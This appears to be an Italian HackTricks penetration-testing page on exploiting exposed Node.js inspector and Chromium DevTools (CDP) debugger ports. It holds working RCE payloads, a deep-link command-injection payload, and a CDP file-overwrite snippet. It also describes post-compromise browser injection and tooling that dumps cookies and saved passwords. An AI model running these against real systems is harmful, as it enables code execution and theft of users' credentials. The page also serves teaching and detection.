# Abuso del debugger Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Gli esempi pratici storici includono il walkthrough Multimaster e l'attacco al debugger di Visual Studio Code CVE-2019-1414; usali come contesto specifico per le rispettive versioni, senza presumere che ogni target Electron o Chromium attuale esponga le stesse primitive.<sup>[[1]](#references)[[3]](#references)</sup>

## Informazioni di base

[Come indicato nella documentazione](https://nodejs.org/learn/getting-started/debugging): quando viene avviato con l'opzione `--inspect`, un processo Node.js resta in ascolto per un client di debug. Per **impostazione predefinita**, resta in ascolto all'host e sulla porta **`127.0.0.1:9229`**. A ogni processo viene inoltre assegnato un **UUID univoco**.<sup>[[4]](#references)</sup>

I client Inspector devono conoscere e specificare l'indirizzo host, la porta e l'UUID per connettersi. Un URL completo sarà simile a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Poiché il **debugger ha pieno accesso all'ambiente di esecuzione Node.js**, un malintenzionato in grado di connettersi a questa porta potrebbe eseguire codice arbitrario per conto del processo Node.js (**potenziale escalation dei privilegi**).<sup>[[4]](#references)</sup>

Esistono diversi modi per avviare un Inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Quando avvii un processo sottoposto a ispezione, apparirà qualcosa del genere:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

I processi basati su **CEF** (**Chromium Embedded Framework**) possono esporre un debugger con `--remote-debugging-port=9222`. Questo espone il browser tramite il [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) anziché un inspector di Node.js, quindi i payload basati su `process` di Node.js non sono direttamente applicabili per impostazione predefinita.<sup>[[2]](#references)[[5]](#references)</sup>

Quando avvii un browser in modalità debug, apparirà qualcosa del genere:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerare e controllare un endpoint CDP

Gli endpoint HTTP di discovery distinguono il WebSocket del **browser** dai WebSocket dei singoli **target** (scheda, worker, estensione ecc.). Interroga `/json/version` per l'endpoint del browser e `/json/list` per i target; i valori `webSocketDebuggerUrl` restituiti possono quindi essere controllati direttamente tramite i messaggi simili a JSON-RPC di CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Ad esempio, connettiti con `websocat "$BROWSER_WS"` e invia `{"id":1,"method":"Target.getTargets"}` oppure `{"id":2,"method":"Storage.getCookies"}`. Su un target di pagina (`websocat "$PAGE_WS"`), `Runtime.evaluate` viene eseguito nel renderer e `Page.captureScreenshot` restituisce uno screenshot codificato in base64. `document.cookie` non può rivelare i cookie `HttpOnly`, mentre `Storage.getCookies` interroga il cookie store del browser.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Browser, WebSocket e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

I siti web aperti in un browser possono effettuare richieste WebSocket e HTTP secondo il modello di sicurezza del browser. È necessaria una **connessione HTTP iniziale** per **ottenere un ID di sessione del debugger univoco**. La **same-origin policy** **impedisce** ai siti web di effettuare **questa connessione HTTP**. Per una maggiore sicurezza contro gli [**attacchi DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica che gli **header 'Host'** della connessione specifichino un **indirizzo IP** oppure esattamente **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Queste **misure di sicurezza impediscono di sfruttare l'inspector** per eseguire codice **inviando semplicemente una richiesta HTTP** (cosa che si potrebbe fare sfruttando una vulnerabilità SSRF).<sup>[[4]](#references)</sup>

### Avvio dell'inspector nei processi in esecuzione

È possibile inviare il **segnale SIGUSR1** a un processo nodejs in esecuzione per fare in modo che **avvii l'inspector** sulla porta predefinita. Tuttavia, è necessario disporre di privilegi sufficienti: questo potrebbe concederti **accesso privilegiato alle informazioni all'interno del processo**, ma non un'escalation diretta dei privilegi.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Questo è utile nei container perché **arrestare il processo e avviarne uno nuovo** con `--inspect` **non è un'opzione**, poiché il **container** verrà **terminato** insieme al processo.<sup>[[6]](#references)</sup>

### Connettersi all'inspector/debugger

Per connettersi a un **browser basato su Chromium**, è possibile accedere agli URL `chrome://inspect` o `edge://inspect` rispettivamente per Chrome o Edge. Facendo clic sul pulsante Configure, è necessario verificare che siano elencati correttamente l'**host e la porta di destinazione**. L'immagine mostra un esempio di Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Dopo l'URL per accedere al debugger apparirà, ad esempio ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Connettersi all'inspector/debugger: per connettersi a un browser basato su Chromium, ...](<../../images/image (674).png>)

Usando la **riga di comando**, puoi connetterti a un debugger/inspector con:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Lo strumento [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) consente di **trovare gli inspector** in esecuzione localmente e **iniettare codice** al loro interno.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Nota che gli exploit **RCE in NodeJS non funzioneranno** se connessi a un browser tramite [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (è necessario consultare l'API per trovare cose interessanti da farci).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE nel Debugger/Inspector di NodeJS

> [!TIP]
> Se sei arrivato qui cercando di ottenere [**RCE da una XSS in Electron, consulta questa pagina.**](../../desktop-application-security/electron-desktop-apps/index.html)

Alcuni metodi comuni per ottenere **RCE** quando è possibile **connettersi** a un inspector di Node consistono nell'usare qualcosa come (a quanto pare, **non funzionerà con una connessione al Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payload del Chrome DevTools Protocol

Puoi consultare l'API qui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In questa sezione elencherò solo alcune cose interessanti che ho visto usare per sfruttare questo protocollo.

### Restrizione del profilo predefinito in Chrome 136+

A partire da **Chrome 136**, Chrome ignora `--remote-debugging-port` e `--remote-debugging-pipe` quando puntano alla **directory dati predefinita di Chrome**. L'opzione deve essere abbinata a un `--user-data-dir` non standard, la cui chiave di crittografia separata e lo stato isolato del browser impediscono alla semplice tecnica basata su flag di esporre il normale profilo autenticato dell'utente. Non si deve presumere che questa restrizione specifica di Chrome si applichi anche alle versioni precedenti di Chrome, a Chrome for Testing, alle applicazioni Electron/CEF o ad altre derivate di Chromium senza averlo verificato.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Pertanto, vedere un processo Chrome attualmente avviato solo con `--remote-debugging-port` **non** dimostra che CDP sia diventato attivo. Verifica il listener e `/json/version`, e determina quale profilo lo supporta.<sup>[[14]](#references)</sup>

### Iniezione di parametri tramite deep link

Nel caso [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security scoprì che un'applicazione basata su CEF **aveva registrato nel sistema un URI personalizzato** (workspaces://index.html), che riceveva l'URI completo e poi **avviava l'applicazione basata su CEF** con una configurazione costruita in parte a partire da quell'URI.<sup>[[8]](#references)</sup>

Si scoprì che i parametri dell'URI venivano decodificati come URL e usati per avviare l'applicazione basata su CEF, consentendo a un utente di **iniettare** il flag **`--gpu-launcher`** nella **command line** ed eseguire comandi arbitrari.<sup>[[8]](#references)</sup>

Quindi, un payload del tipo:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Eseguirà un calc.exe.<sup>[[8]](#references)</sup>

### Sovrascrivere file

Modifica la cartella in cui **verranno salvati i file scaricati** e scarica un file per **sovrascrivere** il **codice sorgente** dell’applicazione, usato frequentemente, con il tuo **codice malevolo**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE ed esfiltrazione tramite WebDriver

STAR Labs ha dimostrato che i servizi WebDriver/CDP esposti possono consentire la lettura arbitraria di file e RCE; in alcune configurazioni, il DNS rebinding può completare la catena di exploit.<sup>[[9]](#references)</sup>

Il servizio WebDriver di ChromeDriver è distinto da Chrome DevTools/CDP. La capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) seleziona l'eseguibile del browser avviato per una nuova sessione. Se un utente non privilegiato può raggiungere un servizio ChromeDriver eseguito come root e inviare una sessione con un percorso dell'eseguibile controllato dall'utente, l'avvio può superare il confine dei privilegi del servizio. Una risposta vuota di `/sessions` non dimostra che non sia possibile creare nuove sessioni. Prima di concludere che il percorso sia utilizzabile, verifica il proprietario del processo, l'effettiva raggiungibilità del listener, l'autorizzazione delle sessioni, l'accesso all'eseguibile e le misure di confinamento; il solo nome del processo o la porta comunemente usata non sono sufficienti. [Le indicazioni di sicurezza di Google](https://developer.chrome.com/docs/chromedriver/security-considerations) raccomandano di eseguire ChromeDriver con un account non privilegiato. L'enumerazione passiva non deve creare una sessione WebDriver.

Per altri casi storici relativi all'automazione dei browser e alla sicurezza di Chromium, consulta l'analisi di Counter WebDriver e i problemi 773, 1742 e 1944 di Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Abilitare CDP all'interno di un processo Chromium attivo

La restrizione di Chrome sul profilo predefinito blocca solo il metodo di attivazione da riga di comando. Con accesso sufficiente allo stesso utente per manipolare il processo del browser, l'originale [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) e il [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) di Cobalt Strike invocano il metodo non esportato di Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` all'interno del processo `chrome.exe` o `msedge.exe` già in esecuzione. L'endpoint appartiene quindi al profilo effettivo e conserva le schede, le estensioni, i cookie e lo stato di autenticazione.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Nei normali processi x64 di Chrome/Edge, il BOF individua la finestra del browser e `chrome.dll`/`msedge.dll` caricata, esegue una scansione del PE remoto alla ricerca di signature mascherate, alloca stub e un blocco di contesto, sostituisce temporaneamente la procedura della finestra e invia la chiamata finale al **thread UI** del browser. Gli input runtime pertinenti sono `StartRemoteDebuggingServer`, l'`operator new` di Chromium, `TCPServerSocketFactory::CreateForHttpServer` e la vtable della factory. L'esecuzione si interrompe se una qualsiasi signature obbligatoria non ha una corrispondenza univoca.<sup>[[15]](#references)[[16]](#references)</sup>

Il BOF accetta una modalità browser e una porta facoltativa. Il suo script helper può quindi verificare l'endpoint e raccogliere i cookie; `chrome-iso` è un percorso separato per superare il confine di Windows Process Isolation di Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Il percorso `chrome-iso` usa solo handle con accesso limitato alle query per il processo isolato. Individua la `chrome.dll` installata la cui dimensione dell’immagine PE corrisponde a quella del processo attivo, risolve i simboli da quell’immagine locale e usa il dispatch `WindowImpl` di Chromium, `WM_COPYDATA` sincrono e un hook User32 in un’immagine già esistente per raggiungere il thread UI.<sup>[[16]](#references)</sup>

> [!WARNING]
> Questa è una tecnica di **manipolazione del processo del browser post-compromissione**, non un bypass di rete non autenticato. Dipende dalla build, perché i simboli C++ rilevanti non sono esportati e possono cambiare dopo gli aggiornamenti del browser.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Aggiornamento delle signature dopo gli aggiornamenti del browser

Usa la versione esatta di `chrome.dll` o `msedge.dll` installata sul target e il relativo PDB. `symchk.exe` del Windows SDK scarica i simboli; gli script del repository individuano quindi `StartRemoteDebuggingServer`, ricavano gli input dell’allocator/socket factory oppure convalidano tutte le signature incorporate nel BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Un risultato senza corrispondenze o con più corrispondenze non deve essere sostituito con un indirizzo arbitrario. Se un pattern noto di `operator new` o `CreateForHttpServer` è cambiato troppo per creare una nuova mask, usa `pe_signature_finder.py` con il PDB per esaminare quel simbolo e ricavare una sequenza di byte univoca nel modulo di destinazione.<sup>[[16]](#references)[[18]](#references)</sup>

#### Estrazione dal browser autenticato con CDP Toolkit

Questa tecnica non decritta offline App-Bound Encryption (ABE) né rimuove il binding al dispositivo. Considera invece il browser legittimo come **decryption oracle e proxy per le interazioni autenticate**: `Storage.getCookies` richiede al browser attivo i cookie, mentre i workflow di navigazione/screencast mantengono richieste, storage, autenticazione aziendale e comportamento vincolato al dispositivo all'interno del browser esistente della vittima.<sup>[[17]](#references)[[18]](#references)</sup>

Dopo aver instradato il listener CDP loopback tramite il pivot dell'operatore, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) può enumerare e raccogliere gli artefatti comuni.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` e `tabs screenshot` sono perlopiù wrapper di `/json/version`, dell’elenco dei target, di `Storage.getCookies` e di `Page.captureScreenshot`. Cronologia, segnalibri, estensioni e metadati delle password richiedono invece un target WebUI temporaneo `chrome://`/`edge://`: il toolkit attende il rendering della superficie, ispeziona il relativo modello o DOM, raccoglie il risultato e chiude il target.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` si spinge oltre: apre l’origine reale del login salvato, porta il focus su un campo delle credenziali, seleziona il suggerimento nativo di compilazione automatica usando eventi di input CDP e legge i valori compilati. Origine/porta/percorso devono corrispondere il più possibile al realm della password salvata; la modalità visibile è l’impostazione predefinita più affidabile, perché il popup dei suggerimenti è un’interfaccia nativa del browser.<sup>[[17]](#references)[[18]](#references)</sup>

Per l’interazione in tempo reale, `browser-takeover screencast` trasmette frame e invia input a un target reale (anche in modalità background o off-screen). `browser-takeover proxy` accetta invece localmente HTTP e HTTPS `CONNECT` ed effettua le richieste upstream tramite target Chrome nascosti, ripiegando sulle schede in background quando i target nascosti non sono disponibili; in questo modo preserva il contesto di rete/autenticazione della vittima, ma è meno fedele con applicazioni client-side complesse, perché il browser dell’operatore esegue il rendering dei contenuti restituiti.<sup>[[17]](#references)[[18]](#references)</sup>

Per il rilevamento, non affidarti solo alla telemetria della riga di comando `--remote-debugging-*`: correla anche handle e operazioni di memoria insoliti con i processi del browser (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, creazione di thread), l’iniezione di DLL e i socket di ascolto loopback imprevisti di proprietà di Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

In un ambiente reale, **dopo aver compromesso** un PC utente che usa un browser basato su Chromium, una tecnica storica consisteva nel riavviare il browser con il debugging abilitato e inoltrare la porta loopback. Questo può esporre lo stato di navigazione della vittima sui prodotti/build che accettano ancora il profilo selezionato, ma Chrome 136+ non lo consentirà con la directory dati predefinita.<sup>[[7]](#references)[[14]](#references)</sup>

Il comando di riavvio originale è riportato qui sotto per i target meno recenti o specifici di una versione. Il secondo comando è il metodo supportato per le versioni attuali di Chrome, ma crea un profilo isolato anziché riaprire il normale stato autenticato della vittima.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Per le tecniche specifiche di macOS relative al riavvio di Chromium, alle estensioni e a CDP, consulta [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Strumento di ispezione e sfruttamento del debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution in Visual Studio Code tramite il debugger Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guida al debugging di Node.js - Primi passi](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protocollo Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup di corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: abusare della funzionalità di debugging di Chrome per osservare e controllare da remoto le sessioni di navigazione](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution in AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Parli con me? - Remote Code Execution di WebDriver tramite DNS rebinding e CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contrastare WebDriver - Da bot a Remote Code Execution](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (bug tracker di Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (bug tracker di Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (bug tracker di Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Modifiche alle opzioni di remote debugging per migliorare la sicurezza - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Iniettare CDP in un browser Edge in esecuzione: approfondimento sulla strumentazione del browser a runtime](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Il ritorno del Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
